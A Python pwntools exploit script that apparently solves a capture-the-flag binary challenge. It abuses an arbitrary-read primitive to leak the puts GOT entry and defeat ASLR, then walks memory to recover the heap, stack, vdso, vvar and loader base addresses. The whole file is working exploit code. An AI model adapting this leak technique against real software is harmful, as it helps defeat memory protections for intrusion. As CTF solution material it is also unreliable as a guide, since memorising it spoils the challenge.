#!/usr/bin/env python3

from pwn import *
import os

os.chdir('./patched')

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF('./ld-linux-x86-64.so.2')

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
    else:
        r = remote("localhost", 1024)
        # r = remote("challs.pwnoh.io", 13375)

    return r

def leakfromaddr(addr, r):
    r.sendlineafter(b'captain?\n', str(addr).encode())
    r.recvuntil(b'gathered ')
    result = int(r.recvuntil(b' ')[:-1].decode())
    return result

def main():
    r = conn()

    # Obtaining libc.address by leaking the value of exe.got.puts
    libc.address = leakfromaddr(exe.got.puts, r) - libc.symbols.puts
    log.info(f"{hex(libc.address)=}")

    # Obtaining the heap base addr
    libc_offset_ref_to_heapbase = 0x00007ffff7fa13c0 - 0x00007ffff7d87000
    heap_base_addr = leakfromaddr(libc.address + libc_offset_ref_to_heapbase, r)
    log.info(f"{hex(heap_base_addr)=}")

    # Obtaining the stack base addr
    libc_offset_ref_to_stack = 0x00007ffff7fada20 - 0x00007ffff7d92000
    argc_addr = leakfromaddr(libc.address + libc_offset_ref_to_stack, r) - 8
    argc = leakfromaddr(argc_addr, r)
    log.info(f"{argc=}")

    cur_addr = argc_addr + 8*(argc+2) # envp0_addr
    while leakfromaddr(cur_addr, r) != 0: # Loop through envp until nullptr is hit
        # log.info(f"envp: {hex(leakfromaddr(cur_addr, r))=}")
        cur_addr += 8
    
    cur_addr += 8 # auxv0-addr
    while leakfromaddr(cur_addr, r) != 0: # Loop through auxv until nullptr is hit
        # log.info(f"auvx: {hex(leakfromaddr(cur_addr, r))=}")
        cur_addr += 8
    # log.info(f"{hex(cur_addr)=}")

    stack_base_addr = cur_addr + ((0x1000 - cur_addr % 0x1000) if cur_addr % 0x1000 != 0 else 0)
    while leakfromaddr(stack_base_addr - 8, r) != 0:
        stack_base_addr += 0x1000
    stack_top_addr = stack_base_addr - (0x00007ffffffff000 - 0x00007ffffffde000)
    log.info(f"{hex(stack_base_addr)=}")
    log.info(f"{hex(stack_top_addr)=}")

    # Obtaining the vdso base addr
    while leakfromaddr(cur_addr, r) != 33:
        cur_addr -= 8
    vdso_base_addr = leakfromaddr(cur_addr+8, r)
    log.info(f"{hex(vdso_base_addr)=}")

    # Obtaining the vvar base addr
    vvar_base_addr = vdso_base_addr - (0x00007ffff7fc1000 - 0x00007ffff7fbd000)
    log.info(f"{hex(vvar_base_addr)=}")

    # Obtaining the ld base addr
    ld.address = leakfromaddr(0x404010, r) - (0x00007ffff7fd8d30 - 0x00007ffff7fc3000) # For some reason, ld.symbols._dl_runtime_resolve_xsavec doesn't work - probably pwntools isn't detecting the symbol for some reason
    log.info(f"{hex(ld.address)=}")

    input('bruh')

    # Start the report function
    r.sendlineafter(b'captain?\n', b'0')
    r.recvuntil(b'Where in the world is ')

    # Submit the obtained addr's to the binary (note that the exe base addr, as well as the most likely stack_top_addr changed due to patching locally)
    # IMPT: Use (still may not always work) stack_top_addr+0x1000 for process([exe.path]) and stack_top_addr+0x2000 for gdb.debug([exe.path])
    report_arr = [0x3ff000 if args.LOCAL else 0x400000, heap_base_addr, libc.address, ld.address, stack_top_addr+0x1000 if args.LOCAL else stack_top_addr, vvar_base_addr, vdso_base_addr]
    for report in report_arr:
        r.recvline()
        r.sendline(str(report).encode())
        r.recvline()

    r.interactive()

if __name__ == "__main__":
    main()